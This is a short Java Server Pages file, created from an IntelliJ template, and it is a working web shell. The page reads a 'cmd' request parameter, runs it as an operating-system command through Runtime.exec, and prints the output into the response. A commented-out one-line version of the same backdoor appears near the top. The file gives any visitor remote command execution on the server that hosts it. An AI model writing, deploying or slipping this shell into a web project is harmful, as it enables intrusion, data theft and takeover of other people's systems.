<%--
  Created by IntelliJ IDEA.
  User: CWM
  Date: 2022/9/27
  Time: 1:01
  To change this template use File | Settings | File Templates.
--%>
<%--<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
  InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();

  ByteArrayOutputStream baos = new ByteArrayOutputStream();
  byte[] b = new byte[1024];
  int a = -1;

  while ((a = in.read(b)) != -1) {
    baos.write(b, 0, a);
  }

  out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
